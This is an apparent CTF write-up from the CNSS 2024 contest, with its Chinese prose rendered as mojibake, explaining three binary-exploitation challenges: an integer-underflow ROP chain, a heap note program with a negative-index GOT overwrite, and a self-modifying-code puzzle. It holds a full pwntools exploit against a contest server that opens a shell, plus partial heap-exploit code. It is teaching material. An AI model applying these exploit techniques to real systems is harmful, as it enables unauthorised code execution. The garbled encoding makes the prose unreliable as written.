ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Orchid
```
##### &emsp;&emsp;&emsp;è°œè¯­äººé¢˜ç›®ï¼Œå‰ç½®çŸ¥è¯†æ˜¯çœ‹è¿‡å¤´å·ç©å®¶ï¼ˆè‡³å°‘ç¬¬ä¸€å…³ï¼‰<br>&emsp;&emsp;&emsp;å®ç°é€»è¾‘æ¯”è¾ƒé•¿ï¼Œè¿™é‡Œå°±ä¸è´´äº†ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ ¹æ®ç¨‹åºçš„éšæœºè¾“å‡ºï¼Œåšä¸€ä¸ªç±»ä¼¼Yes or Noçš„æ¸¸æˆï¼Œåˆå§‹æœ‰30åˆ†ï¼Œ50æ¬¡æœºä¼šï¼Œç­”å¯¹ä¸€æ¬¡åŠ ä¸€åˆ†ï¼Œé”™ä¸€æ¬¡å‡ä¸€åˆ†ã€‚ç©å®Œä¹‹åï¼Œæœ‰ä¸€ä¸ªè¯»å…¥å­—ç¬¦ä¸²çš„æœºä¼šï¼Œæœ‰å¤šå°‘åˆ†å°±å¯ä»¥è¯»å¤šå°‘å­—ç¬¦ã€‚<br>&emsp;&emsp;&emsp;æœ¬é¢˜ä¾ç„¶checksecé­…åŠ›æ—¶åˆ»
```sh
root@PainTech:/home/pwn/worktable/cnss2024# checksec pwn6
[*] '/home/pwn/worktable/cnss2024/pwn6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
##### &emsp;&emsp;&emsp;æ˜¾ç¤º```Canary found```ï¼Œå®é™…ä¸Šæ ¹æœ¬æ²¡æœ‰ã€‚ä¸€èˆ¬é¢˜ç›®å¯ä»¥åœ¨IDAä¸­å»æ‰¾æ‰¾```__stack_chk_fail```å‡½æ•°ï¼Œå¦‚æœæœ‰å°±æ˜¯æœ‰Canaryï¼›ä½†æœ¬é¢˜é™æ€é“¾æ¥ï¼Œä¸œè¥¿å¤šä¸å¥½æ‰¾ï¼Œæ‰€ä»¥åŠ¨è°ƒçœ‹```rbp - 0x8```æœ‰æ²¡æœ‰Canaryï¼Œå‘ç°æ²¡æœ‰ã€‚<br>
##### &emsp;&emsp;&emsp;æœ¬é¢˜çš„æ‰“æ³•æœ‰ä¸¤ç§ï¼Œå…ˆè¯´æ­£è§£ï¼Œä¹Ÿå°±æ˜¯å’Œå¤´å·ç©å®¶æœ‰å…³ç³»çš„è§£æ³•ã€‚
![Screenshot 2024-09-27 103245.png](https://www.helloimg.com/i/2024/09/27/66f617fc16ef9.png)
##### &emsp;&emsp;&emsp;å…³é”®ç‚¹åœ¨äºæ­£ç€å¼€ä¸è¡Œè¦ä½ å€’ç€å¼€ã€‚ç”±äºæ²¡Canaryï¼Œæ‰€ä»¥è¦æ‰“ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œä½†é—®é¢˜æ˜¯å¦‚æœå…¨éƒ¨ç­”å¯¹ï¼Œä¹Ÿåªæœ‰80å­—èŠ‚ï¼Œè¿™ä¸ªå¤§å°åªå¤Ÿæ°å¥½è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œæ ¹æœ¬ä¸å¤ŸROPchainï¼ˆæœ¬é¢˜æ²¡æœ‰backdoorï¼‰
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  char v8[16]; // [rsp+0h] [rbp-50h] BYREF
  char v9[40]; // [rsp+10h] [rbp-40h] BYREF // <-----ç›®æ ‡å­—ç¬¦ä¸²
  int v10; // [rsp+38h] [rbp-18h]
  int v11; // [rsp+3Ch] [rbp-14h]
  int v12; // [rsp+40h] [rbp-10h]
  int v13; // [rsp+44h] [rbp-Ch]
  int i; // [rsp+48h] [rbp-8h]
  unsigned int v15; // [rsp+4Ch] [rbp-4h] // <------å¾—åˆ†å’Œ
                                          // ä¹Ÿå°±æ˜¯æœ€åè¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦
}
```
##### &emsp;&emsp;&emsp;ç»†å¿ƒçš„ç«¥é‹è‚¯å®šå‘ç°ï¼Œåªæœ‰v15æ˜¯æ— ç¬¦å·æ•°ï¼Œå…¶ä»–éƒ½æ˜¯æœ‰ç¬¦å·æ•°ï¼Œæ°å·§åˆæœ‰å¯¹v15åšå‡æ³•çš„æ“ä½œï¼ˆç­”é”™é¢˜ç›®ï¼‰ï¼Œæ‰€ä»¥å¦‚æœæ•…æ„ç­”é”™é¢˜ç›®ï¼ˆæ—¢å€’ç€å¼€ï¼‰ï¼Œv15å°±ä¼šå‘ä¸‹æº¢å‡ºä¸ºä¸€ä¸ªå¾ˆå¤§æ­£æ•´æ•°ï¼Œæ­¤æ—¶æ„é€ ROPchainï¼Œæ‰“ä¸€ä¸ª ***ret2syscall*** å®Œå…¨è¶³å¤Ÿäº†ã€‚<br>
##### &emsp;&emsp;&emsp;ç„¶åè¯´å¦ä¸€ç§è§£æ³•ï¼Œä¹Ÿå°±æ˜¯å“¥ä»¬ç‹¬åˆ›çš„è§£æ³•ï¼Œè¿˜æŠŠä¸Šå›¾é‚£ä¸ªå°ç™»ç»™å¸¦åäº†ğŸ¤£ã€‚<br>&emsp;&emsp;&emsp;å¦‚æœä¸è€ƒè™‘æ•´å‹å‘ä¸‹æº¢å‡ºçš„è¯ï¼Œé‚£ä¹ˆæ­£å¥½æº¢å‡ºåˆ°è¿”å›åœ°å€å¯ä»¥æŒ‰ç…§æ ˆè¿ç§»çš„æ€è·¯æ¥æ‰“ã€‚
```sh
.text:0000000000401B76 loc_401B76:                             ; CODE XREF: main+227â†‘j
.text:0000000000401B76                 mov     edx, 19h
.text:0000000000401B7B                 lea     rax, aNowShowMeYourP ; "Now, show me your power!\n"
.text:0000000000401B82                 mov     rsi, rax
.text:0000000000401B85                 mov     edi, 1
.text:0000000000401B8A                 call    write
.text:0000000000401B8F                 mov     edx, 14h
.text:0000000000401B94                 lea     rax, aSayTheMagicWor ; "Say the magic word!\n"
.text:0000000000401B9B                 mov     rsi, rax
.text:0000000000401B9E                 mov     edi, 1
.text:0000000000401BA3                 call    write
.text:0000000000401BA8                 mov     edx, [rbp+var_4]
.text:0000000000401BAB                 lea     rax, [rbp+var_40]
.text:0000000000401BAF                 mov     esi, edx
.text:0000000000401BB1                 mov     rdi, rax
.text:0000000000401BB4                 call    myRead
.text:0000000000401BB9                 mov     eax, 0
.text:0000000000401BBE                 leave
.text:0000000000401BBF                 retn
.text:0000000000401BBF ; } // starts at 40192E
.text:0000000000401BBF main            endp
```
##### &emsp;&emsp;&emsp;æ­¤å¤„ä¸º ```main()``` æœ€åçš„è¾“å…¥å­—ç¬¦ä¸²çš„éƒ¨åˆ†ï¼Œæ³¨æ„åˆ°```0x401BA8```å¼€å§‹ä¸º```myread()```ï¼ˆå¯è§†ä¸ºä¸€èˆ¬çš„```read()```ï¼‰å‡†å¤‡å‚æ•°ï¼Œå…¶ä¸­```var_4```ï¼Œ```var_40```éƒ½æ˜¯å›ºå®šå€¼ï¼ˆ-4å’Œ-40ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥å°†```rbp```è¿ç§»åˆ°æŸä¸ª```-4```ä½ç½®ä¸ºä¸€ä¸ªè¾ƒå¤§æ•°çš„ä½ç½®ï¼Œè¿™æ ·å¯ä»¥å®ç°è¯»å¤§é‡å­—ç¬¦ä¸²ã€‚<br>&emsp;&emsp;&emsp;äºæ˜¯å»æ‰¾ä¸€å—ç¬¦åˆæ¡ä»¶çš„é£æ°´å®åœ°
```sh
.data:00000000004A0277                 db    0
.data:00000000004A0278                 db 0FFh
.data:00000000004A0279                 db 0FFh
.data:00000000004A027A                 db 0FFh
.data:00000000004A027B                 db 0FFh
.data:00000000004A027C                 db 0FFh
.data:00000000004A027D                 db 0FFh
.data:00000000004A027E                 db 0FFh
.data:00000000004A027F                 db 0FFh
```
##### &emsp;&emsp;&emsp;éšä¾¿æ‰¾ä¸€ä¸ªå³å¯<br>
##### &emsp;&emsp;&emsp;ç„¶åæ˜¯è¿”å›åœ°å€ï¼Œç†è®ºä¸Šå¯ä»¥é€‰```0x4019CE```åŠä»¥ä¸‹çš„ä»»æ„ä½ç½®ï¼Œä½†æ˜¯ä¸Šå¦‚æœç›´æ¥è·³è½¬åˆ°ä¸Šé¢```myread()```çš„ä½ç½®ä¼šSEGVï¼ŒçŒœæµ‹æ˜¯æ ˆæ²¡å¸ƒç½®å¥½ï¼Œè®¿é—®åˆ°éæ³•å†…å­˜äº†ï¼Œè€Œè·³è½¬åˆ°```0x4019CE```å°±æ²¡æœ‰é—®é¢˜ï¼Œå½“ç„¶è¿™æ„å‘³ç€è¦å†æ¥50ç»„æ¸¸æˆï¼Œè™½ç„¶è¿™æ¬¡å¯ä»¥éšä¾¿ç©ã€‚<br>
```sh
.text:00000000004019C7                 mov     [rbp+var_4], 30
.text:00000000004019CE                 mov     [rbp+var_10], 50
.text:00000000004019D5                 lea     rax, asc_474107 ; "-------------------------"
.text:00000000004019DC                 mov     rdi, rax
.text:00000000004019DF                 call    puts
.text:00000000004019E4                 mov     [rbp+var_8], 0
.text:00000000004019EB                 jmp     loc_401B6A
```
##### &emsp;&emsp;&emsp;ç”±æˆ‘ä»¬æ§åˆ¶çš„```myread()```ç»“æŸåï¼Œç¨‹åºå°†```leave ret```ï¼Œè¿™ä¹Ÿæ˜¯è¿™ç§æ°å¥½åªæº¢å‡ºè¿”å›åœ°å€çš„é¢˜ç›®åœ¨æ ˆè¿ç§»æ—¶å…³é”®çš„ä¸€ç‚¹ï¼Œæ—¢ä¸å°†è¿”å›åœ°å€è¦†ç›–ä¸º```leave ret```ï¼Œè€Œæ˜¯æƒ³åŠæ³•è¦å†æ¬¡åˆ©ç”¨ ```read()``` ï¼Œå¾€```fake_rbp``` ä¸Šå†™ä¸€äº›ä¸œè¥¿ï¼Œç„¶åç”¨å‡½æ•°æœ«å°¾è‡ªå¸¦çš„```leave ret```ï¼Œå®Œæˆå‘ç›®æ ‡ä½ç½®çš„æ ˆè¿ç§»ã€‚<br>&emsp;&emsp;&emsp;å¯¹äºè¿™é¢˜è€Œè¨€ï¼Œ```leave ret```çš„æµç¨‹æ˜¯å°†```rsp```éª—åˆ°æˆ‘ä»¬è¾“å…¥åœ°å€```+0x40```çš„ä½ç½®ï¼Œ```pop rbp```è¯¥ä½ç½®ï¼Œç„¶å```ret```ä¸Šä¸€ä¸ªå­—é•¿ä½ç½®ã€‚è¿™æ„å‘³ç€éœ€è¦åœ¨è¾“å…¥æ—¶è®¾ç½®```0x40 + 0x8```çš„æ²¡å•¥ç”¨æ•°æ®ï¼Œç„¶åæ‰æ˜¯ROPchainã€‚<br>
##### &emsp;&emsp;&emsp;ç”±äºä¸æ˜¯æ ‡è§£ï¼Œæ‰€ä»¥æŠŠè¿™ç§expæ”¾ä¸Šæ¥ï¼Œä»…ä¾›å‚è€ƒ
```python
from pwn import *

context.log_level = "debug"
# io = process("./pwn6")
elf = ELF("./pwn6")
io = remote("152.136.11.155", 31514)
syscall = 0x401291
bin_sh = 0x474010
rax_ret = 0x41dd07
rdi_ret = 0x402368
rsi_ret = 0x409560
rdx_rcx_ret = 0x401855
main = 0x4019ce
myread = 0x401B7b
data_2 = 0x4A0698 + 4 # 0x4a069c
ret = 0x401016

for i in range(50):
    io.recvuntil(b'-------------------------\n')
    target = io.recvline()
    print(target)
    print(io.recvuntil(b'?'))
    if target.find(b'Clomp') != -1:
        io.sendline(b'O')
    else:
        io.sendline(b'C')

io.recvuntil(b'word!\n') # 80 0x50
payload = b'a'*0x40 + p64(data_2) + p64(main) # change rbp
io.send(payload)
sleep(0.1)

for i in range(50):
    io.recvuntil(b'-------------------------\n')
    target = io.recvline()
    print(target)
    print(io.recvuntil(b'?'))
    if target.find(b'Clomp') != -1:
        io.sendline(b'O')
    else:
        io.sendline(b'C')

payload = p64(ret)*8 + p64(oxdeadbeef)
payload += p64(rax_ret) + p64(59)
payload += p64(rdi_ret) + p64(bin_sh) + p64(rsi_ret) + p64(0)
payload += p64(rdx_rcx_ret) + p64(0) + p64(0) + p64(syscall)

io.recvuntil(b'word!\n') # 80 0x50
io.sendline(payload)

io.interactive()
```
### ğŸ—’ å‡çœ¸å›é¦–æ˜ èŠ³å
```
âš  é¢˜ç›®æè¿°
CNSS å¨˜è§‰å¾—å¸‚é¢ä¸Šçš„ç¬”è®°è½¯ä»¶éƒ½ä¸å®‰å…¨ï¼Œæœ‰è¢«æ³„éœ²çš„é£é™©ï¼Œäºæ˜¯è‡ªå·±æ‰‹æ“äº†ä¸€ä¸ªç¬”è®°è½¯ä»¶é›å½¢å‡ºæ¥~

nc 152.136.11.155 10036

ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Timlzh
```
###### &emsp;&emsp;&emsp;ä»¥ä¸‹æ˜¯å‡ºé¢˜äººçš„å¿ƒè·¯å†ç¨‹ã€‚
![Screenshot 2024-09-27 112702.png](https://www.helloimg.com/i/2024/09/27/66f65b0bb5560.png)
![Screenshot 2024-09-27 112735.png](https://www.helloimg.com/i/2024/09/27/66f65b0bcdcc6.png)
![Screenshot 2024-09-27 112746.png](https://www.helloimg.com/i/2024/09/27/66f65b0bc6c93.png)
##### &emsp;&emsp;&emsp;çœ‹noteçŸ¥å †é¢˜ï¼Œå¢åˆ æ”¹çœ‹åŠŸèƒ½é½æ´».
```sh
[*] '/home/pwn/worktable/cnss2024/pwn8/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    SHSTK:      Enabled
    IBT:        Enabled
```
##### &emsp;&emsp;&emsp;GOTè¡¨å¯å†™ã€ç„¶åæ²¡æœ‰PIEã€‚æ²¡æœ‰å †é¢˜å¸¸è§çš„UAFã€å †æº¢å‡ºã€offset-by-oneç­‰ã€‚ä¸è¿‡å³ä½¿å…·ä½“æ¼æ´è¿˜æ²¡æ‰¾åˆ°ï¼Œä¹Ÿä¾ç„¶å¯ä»¥å…ˆ ```leak libc``` ã€‚ <br>&emsp;&emsp;&emsp;é¦–å…ˆ```strings ./libc.so.6 | grep "glibc"``` å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¸º2.35ï¼Œæ‰€ä»¥é“æœ‰tcache
```python
for i in range(9):
    add(i, 0x80, b'a') # 0 ~ 8
for i in range(8):
    free(i)  # free 0~7

for i in range(7):
    add(i, 0x80, b'') # 0 ~ 8

add(8, 0x8, b'a'*8) # 8
show(8)
```
##### &emsp;&emsp;&emsp;```show(8)```æ—¶å°±æŠŠ libc æ³„éœ²äº†<br>
##### &emsp;&emsp;&emsp;ç°åœ¨å†æ¥æ‰¾å…·ä½“çš„æ¼æ´<br>&emsp;&emsp;&emsp;å…ˆå…³æ³¨ä¸€ä¸‹å †ä¿¡æ¯çš„å­˜å‚¨æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯```1. Create a new page of notes```
```c
        case 1:
          printf("Enter index: ");
          v4 = readint();
          printf("Enter length: ");
          v8 = readint();
          *((_DWORD *)&heap + 4 * v4) = v8;
          *((_QWORD *)&heap + 2 * v4 + 1) = malloc((int)v8);
          printf("Enter content: ");
          readstr(*((_QWORD *)&heap + 2 * v4 + 1), v8);
          break;
```
##### &emsp;&emsp;&emsp;```v8```å’Œ```malloc((int)v8)```é‚£ä¸¤è¡Œå°±è¡¨æ˜äº†å †ä¿¡æ¯çš„å­˜å‚¨æ–¹å¼ã€‚å¯¹äºè¿™ç§ä¸œè¥¿ï¼Œæˆ‘çš„æ„è§æ˜¯ï¼Œèƒ½çœ‹å°±çœ‹ï¼Œä¸èƒ½çœ‹ç›´æ¥åŠ¨è°ƒï¼Œå¦‚ä¸‹ã€‚
```sh
# ç”³è¯·ä¸€ä¸ª0x10å¤§å°çš„å †ï¼Œindex = 0
pwndbg> x/10gx 0x4040C0
0x4040c0:       0x0000000000000010      0x00000000004052a0
0x4040d0:       0x0000000000000000      0x0000000000000000
0x4040e0:       0x0000000000000000      0x0000000000000000
0x4040f0:       0x0000000000000000      0x0000000000000000
0x404100:       0x0000000000000000      0x0000000000000000
```
##### &emsp;&emsp;&emsp;ä»åŠ¨è°ƒç›´æ¥çœ‹å‡ºï¼Œé¦–å…ˆè¾“å…¥ä¸€ä¸ª```index```ï¼Œç¡®è®¤ä»heap(0x4040c0)å¼€å§‹çš„åç§»ï¼Œæ¯16å­—èŠ‚ä½œä¸ºä¸€ä¸ªç»“æ„ä½“ï¼Œå‰8ä¸ªå­˜å †å¤§å°ï¼Œå8ä¸ªæ˜¯å †çš„æŒ‡é’ˆã€‚
##### &emsp;&emsp;&emsp;æ¥ä¸‹æ¥æ˜¯```2. View notes```ï¼Œå°±æ˜¯æ‰“å°
```c
case 2:
          printf("Enter index: ");
          v5 = readint();
          puts(*((const char **)&heap + 2 * v5 + 1));
          break;
```
##### &emsp;&emsp;&emsp;ç”¨çš„```puts```ï¼Œæ‰€ä»¥æ‰èƒ½æŠŠ```libc + offset```å¸¦å‡ºæ¥ï¼Œå¦‚æœä¸¥æ ¼æŒ‰å †å¤§å°è¾“å‡ºï¼Œä¸Šé¢leak libcå°±æ²¡æˆäº†ã€‚
##### &emsp;&emsp;&emsp;çœ‹çœ‹```3. Delete notes```
```c
case 3:
          printf("Enter index: ");
          v6 = readint();
          free(*((void **)&heap + 2 * v6 + 1));
          *((_QWORD *)&heap + 2 * v6 + 1) = 0LL;
          *((_DWORD *)&heap + 4 * v6) = 0;
          break;
```
##### &emsp;&emsp;&emsp;æ²¡æœ‰UAFï¼Œä¸‹ä¸€ä¸ª
##### &emsp;&emsp;&emsp;
```c
      if ( v3 != 4 )
        break;
      printf("Enter index: ");
      v7 = readint();
      printf("Enter content: ");
      readstr(*((_QWORD *)&heap + 2 * v7 + 1), *((unsigned int *)&heap + 4 * v7));
```
##### &emsp;&emsp;&emsp;ä¹Ÿæ²¡å•¥å¥½è¯´çš„ã€‚<br>&emsp;&emsp;&emsp;é‚£æ•´è¿™ä¹ˆå¤šæ²¡ç”¨çš„é‚£ä¹ˆæ¼æ´åœ¨å“ªé‡Œå‘¢ï¼Ÿå¯¹äºè¿™é“é¢˜çš„æ¼æ´ï¼Œå¯èƒ½éœ€è¦å †é¢˜æ–¹é¢çš„ä¸€äº›ç»éªŒã€‚<br>&emsp;&emsp;&emsp;ä¸€èˆ¬çš„å †é¢˜ï¼ŒæŠ›å¼€å †ä¿¡æ¯çš„å­˜å‚¨å¯èƒ½ä¸åŒä¹‹å¤–ï¼Œéƒ½æœ‰ä¸€äº›å›ºå®šçš„è§„å¾‹ã€‚ç¬¬ä¸€ï¼Œå †çš„ç´¢å¼•æ˜¯ç³»ç»Ÿåˆ†é…ï¼Œç¨‹åºæŸ¥è¯¢å¯ç”¨ç´¢å¼•è¿›è¡Œåˆ†é…ï¼›ç¬¬äºŒï¼Œå †çš„ç´¢å¼•æœ‰ä¸€å®šé™åˆ¶ï¼Œä¸èƒ½è¿‡å¤§ï¼Œä¹Ÿå°±æ˜¯å †çš„ç”³è¯·æ•°é‡æœ‰é™åˆ¶ï¼›ç¬¬ä¸‰ï¼Œåœ¨åˆ†é…æˆ–è€…é‡Šæ”¾å †å—æ—¶ï¼Œé¦–å…ˆå¯¹å­˜æ”¾å †ä¿¡æ¯çš„ä½ç½®æ£€æŸ¥ï¼Œç¡®è®¤ç›®æ ‡ä½ç½®ï¼Œé¿å…é€ æˆæŒ‡é’ˆé‡å¤è¦†ç›–æˆ–è€…```free()```é‡Šæ”¾æ— æ•ˆç©ºé—´ã€‚<br>&emsp;&emsp;&emsp;æ‰€ä»¥å†çœ‹è¿™é“é¢˜ï¼Œè¿™äº›ç‰¹å¾å®Œå…¨æ²¡æœ‰ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ•´ä½“çš„é€»è¾‘å®ç°è¾ƒçŸ­ã€‚å½“æˆ‘ä»¬å›å¤´å†çœ‹```case 1```æ—¶ï¼Œå‘ç°```v4```å’Œ```v8```æ˜¯æœ‰ç¬¦å·æ•´å‹ï¼Œå°¤å…¶```v4```ï¼Œç”±äºå †ä¿¡æ¯çš„å¯»å€ä¸æ˜¯æ•°ç»„è®¿é—®ï¼Œ```v4```åœ¨å¯»å€æ—¶ä¸ä¼šè¢«è½¬åŒ–ä¸ºæ•´å‹ï¼Œæ‰€ä»¥å½“```v4```ä¸ºä¸€ä¸ªè´Ÿæ•°æ—¶ï¼Œåè€Œä¼šåå‘å»å¯»å€ï¼ŒåŠ ä¸Šå¯¹è¯¥ä½ç½®çš„èµ‹å€¼ï¼Œå®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ªä»»æ„å†™çš„æ¼æ´ï¼Œä¸è¿‡åªèƒ½æ¯ä¸¤ä¸ªå­—é•¿ä¸­å†™ä¸€ä¸ªå­—é•¿ï¼Œå³ä½¿è¿™æ ·ä¹Ÿå·²ç»è¶³å¤Ÿäº†ã€‚<br>&emsp;&emsp;&emsp;ç”±äºGOTè¡¨å¯å†™ï¼Œå¹¶ä¸”å·²ç»leak libcï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨è´Ÿç´¢å¼•å‘ä¸Šä¿®æ”¹GOTè¡¨ã€‚è¦ä¿®æ”¹çš„GOTè¡¨éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ã€‚é¦–å…ˆï¼ŒGOTè¡¨é¡¹ä½äº```0x40xxx0```åˆ°```0x40xxx8```ï¼Œè¿™ä¸ªä½ç½®è¢«ç”¨äºå­˜æ”¾```v8```çš„å€¼ï¼›å…¶æ¬¡ï¼Œç”±äº```v8```æ˜¯```int```ï¼Œåªæœ‰ä½4ä½å¯ä»¥è¦†ç›–ï¼Œéœ€è¦æ›´é«˜çš„ä½ç½®å·²ç»è¢«å¡«å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå·²ç»é‡å®šä½è¿‡çš„GOTè¡¨é¡¹ã€‚è€ƒå¯Ÿä¸Šè¿°ä¸¤ç‚¹ï¼Œäºæ˜¯é€‰æ‹©```atoi()```çš„GOTè¡¨ã€‚<br>&emsp;&emsp;&emsp;æ”¹å®Œä¹‹åï¼Œåœ¨å†å‘é€```'/bin/sh\x00'```å³å¯ã€‚
```python
v8_4 = system_addr & 0xffffffff
info("low 4 bytes", v8_4)
add({ç®€å•è®¡ç®—åç§»å¾—åˆ°çš„è´Ÿç´¢å¼•}, v8_4, b'a') # æ›´æ”¹å4bytes
io.sendline(b'/bin/sh\x00')
io.interactive()
```
### ğŸ® Super Mario Code Revenge(ğŸ˜¡Hard)
```
âš  é¢˜ç›®æè¿°
Sh1no å‡ºäº†ä¸€ä¸ªç®€å•çš„å †é¢˜ã€‚å› ä¸ºè¿™ä¸ªé¢˜å¤ªç®€å•äº†æ‰€ä»¥ Sh1no å†³å®šå‘æŒ¥ä»–åœ¨ Re é‡Œå­¦åˆ°çš„é«˜è¶…æŠ€æœ¯â€”â€”ä»£ç è‡ªè§£å¯†å£³æ¥è®©ä½ æ²¡æ³•è½»æ˜“é€†å‘æ¼æ´å‡½æ•°ã€‚

çœ‹ä¸åˆ°äº†å§å˜¿å˜¿ï¼Œå¿«ä½¿ç”¨ä½ é«˜è¶…çš„ Fuzz æŠ€å·§æ¥è¯•è¯•å§ï¼

nc 152.136.11.155 10038

ğŸ’¡ Hint
ç›´æ¥åŠ¨æ€è°ƒè¯•å°±å¯ä»¥çœ‹åˆ°åŠ å¯†éƒ¨åˆ†çš„ä»£ç 

ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}
å…è´£å£°æ˜ï¼šflag ç”± @Timlzh æä¾›

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Shino
```

##### &emsp;&emsp;&emsp;æœ€å…ˆä¸Šçš„ä¸€é“hardé¢˜ï¼Œå±äºæ˜¯æ¯”è¾ƒæ¸©æ²¹çš„hardï¼Œä½†è¿˜æ˜¯hardã€‚<br>&emsp;&emsp;&emsp;é¦–å…ˆï¼Œæ ¹æ®æç¤ºï¼Œè¿™ä¸ªé¢˜ä½¿ç”¨äº†ä¸€ä¸ªåé€†å‘æŠ€æœ¯ï¼Œå«åš```è‡ªä¿®æ”¹ä»£ç ```ã€‚
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rcx
  int i; // [rsp+4h] [rbp-Ch]
  void *addr; // [rsp+8h] [rbp-8h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("================================================");
  puts("|          SUPER MARIO CODE REVENGE!!!         |");
  puts("|  https://ctf-wiki.org/reverse/obfuscate/smc/ |");
  puts("================================================");
  puts("Enter ur name to enter the Mario World!:");
  __isoc99_scanf("%s", name);
  addr = (void *)((unsigned __int64)marioGame & -getpagesize());
  v3 = getpagesize();
  if ( mprotect(addr, v3, 7) >= 0 )  // <---------- ä»è¿™é‡Œå¼€å§‹
  {
    for ( i = 0; i <= 513; ++i )
      *((_BYTE *)marioGame + i) ^= key[i % 10];
    puts_banner();         // <--------- ä¸€ä¸ªæ‰“å°ç•Œé¢çš„å‡½æ•°
    marioGame(0);       // <---------- è°ƒç”¨è§£å¯†ä¹‹åçš„å‡½æ•°
    return 0;
  }
  else
  {
    puts("Mario Dies. Plz Try again or contact @Shino.");
    return 0;
  }
}
```
###### &emsp;&emsp;&emsp;ç”šè‡³æŠŠæ”»ç•¥è´´åœ¨æ–‡ä»¶é‡Œï¼Œå“­æ­»ã€‚
##### &emsp;&emsp;&emsp;å¯ä»¥çœ‹åˆ°ï¼Œè‡ªä¿®æ”¹ä»£ç å°±æ˜¯åœ¨è¿è¡Œæ—¶è§£å¯†ä»£ç ï¼Œç”±äºIDAæ˜¯é™æ€è°ƒè¯•ï¼Œæ‰€ä»¥æ— æ³•å‘ˆç°æ­£ç¡®çš„ä»£ç ã€‚é¦–å…ˆæŠŠåŠ å¯†ä»£ç æ®µææƒä¸ºrwxï¼ŒåŸæœ¬çš„.textæ²¡æœ‰å†™æƒé™ï¼Œç„¶åï¼Œä»è¿™ä¸ªå‡½æ•°å¼€å§‹ï¼Œæ¯åå­—èŠ‚ä½ä¸€è½®ï¼ŒæŸ¥è¡¨å¼‚æˆ–ï¼Œç›´åˆ°å…¨éƒ¨è§£å¯†å®Œæˆã€‚è¡¨æ˜¯'Pwn5Shino!'è¿™åä¸ªå­—èŠ‚<br>
##### &emsp;&emsp;&emsp;çœ‹ä¸€çœ¼```marioGame```
```c
.text:0000000000401236 ; __unwind {
.text:0000000000401236                 mov     ds:3C8BE02006CF7078h, eax
.text:000000000040123F                 imul    edx, ebx, 2EBC469Bh
.text:0000000000401245                 mov     ah, 0Dh
.text:0000000000401247                 db      26h
.text:0000000000401247                 in      al, 25h
.text:000000000040124A                 jnz     short loc_4012AB
.text:000000000040124C                 outsb
.text:000000000040124D                 xor     eax, 2BE02053h
.text:0000000000401252                 xchg    edx, [rax]
.text:0000000000401254                 nop
.text:0000000000401254 ; ---------------------------------------------------------------------------
.text:0000000000401255                 db 3Fh, 0E3h, 30h
.text:0000000000401258 ; ---------------------------------------------------------------------------
.text:0000000000401258                 jmp     qword ptr [rbp+69h]
.text:0000000000401258 ; ---------------------------------------------------------------------------
.text:000000000040125B                 db 6Eh, 27h, 0A8h, 97h, 9Fh
.text:0000000000401260                 dq 946AE32197ACCB02h, 3381AFDA7D6E775Dh, 65E630E33FAFDE91h
.text:0000000000401278                 dq 0CB209F97A8276E69h, 775D996AE32197ACh, 0DE915181AFDA7D6Eh
.text:0000000000401290                 dq 6E6965E230E33FAFh, 6853356ECF97A827h, 70E33FAFDE913581h
.text:00000000004012A8                 db 0B3h, 20h, 0E0h
.text:00000000004012AB ; ---------------------------------------------------------------------------
.text:00000000004012AB
.text:00000000004012AB loc_4012AB:                             ; CODE XREF: .text:000000000040124Aâ†‘j
```
##### &emsp;&emsp;&emsp;å¯ä»¥çœ‹åˆ°IDAè™½ç„¶åšå‡ºå°è¯•ï¼Œä½†æ˜¾ç„¶åŠ å¯†æ˜¯æœ‰æ•ˆçš„ã€‚<br>&emsp;&emsp;&emsp;è€ƒè™‘ä½¿ç”¨å…ˆä½¿ç”¨IDApythonï¼Œå¯¹è¿™ä¸€æ®µå†…å®¹è§£å¯†ã€‚æ³¨æ„å…ˆ```import idc```
![Screenshot 2024-09-27 203200.png](https://www.helloimg.com/i/2024/09/28/66f75f242322c.png)
##### &emsp;&emsp;&emsp;ä¸‹é¢æ˜¯å¼„å®Œåçš„æ•ˆæœã€‚
![Screenshot 2024-09-28 095529.png](https://www.helloimg.com/i/2024/09/28/66f7606c5daf2.png)
